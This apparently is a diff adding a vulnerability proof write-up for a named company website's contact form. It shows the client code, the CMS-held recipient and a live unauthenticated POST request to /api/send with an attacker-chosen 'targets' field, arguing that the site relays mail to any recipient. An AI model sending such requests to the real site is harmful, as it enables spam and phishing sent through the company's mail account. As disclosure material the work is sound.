@@ -1,0 +1,40 @@
+=== PROOF 1: client sends client-controlled `targets` to POST /api/send ===
+Source: https://www.infinitycapital.bh/_next/static/chunks/275-ea7b562607231006.js  (contact form component)
+
+  let V=async()=>{let l=new FormData;
+    l.set("fname",i), l.set("lname",s), l.set("areacode",d), l.set("tel",c),
+    l.set("cname",m), l.set("subject",n), l.set("msg",r), l.set("check",z),
+    l.set("targets",a.targets);
+    try{let D=await fetch("/api/send",{method:"POST",body:l}).then(l=>l.json());
+      null!==D.data?k("success"):k("fail")}catch(l){k("fail")}}
+
+=> subject (n) and msg (r) are 100% attacker-supplied free text.
+=> targets is a form field, i.e. fully attacker-controlled.
+
+=== PROOF 2: the INTENDED (allow-listed) recipient comes from a client-side CMS value ===
+Source: https://www.infinitycapital.bh/contact  (__next_f flight payload)
+  ..."email":"info@infinitycapital.bh"}},
+  "subjects":["Investment Opportunities","Partnership Inquiries","Media & Press Relations"],
+  "targets":["info@infinitycapital.bh"]}...
+
+=> The "correct" destination is a CLIENT-SIDE (attacker-modifiable) constant:
+   it is shipped to the browser, NOT enforced server-side. Any value the
+   attacker puts in the `targets` POST field is what the server uses.
+
+=== PROOF 3: the client-supplied value is forwarded VERBATIM as the mail API `to` field ===
+POST https://www.infinitycapital.bh/api/send   (no cookie, no auth header, no Origin/Referer)
+  -F "fname=IV" -F "lname=Test" -F "areacode=0" -F "tel=000" -F "cname=IV"
+  -F "subject=s" -F "msg=m" -F "check=1" -F "targets=not-an-email"
+
+HTTP 200 body:
+{"data":null,"error":{"message":"Invalid `to` field. The email address needs to
+follow the `email@example.com` or `Name <email@example.com>` format.",
+"name":"validation_error","statusCode":422}}
+
+WHY THIS IS PROOF: the server's OWN configured target is `info@infinitycapital.bh`,
+which is perfectly valid. A 422 can therefore only be produced because MY supplied
+`targets` value was used. The message text ("Invalid `to` field ... `Name <email@example.com>`
+format") is verbatim the Resend (email.resend.com) send API recipient validator, and
+the site's CSP explicitly allow-lists `connect-src ... https://email.resend.com`.
+=> The attacker-supplied field IS the outbound recipient. There is NO server-side
+   allow-list, NO auth, NO session, NO CSRF token, NO CAPTCHA, NO rate limit.
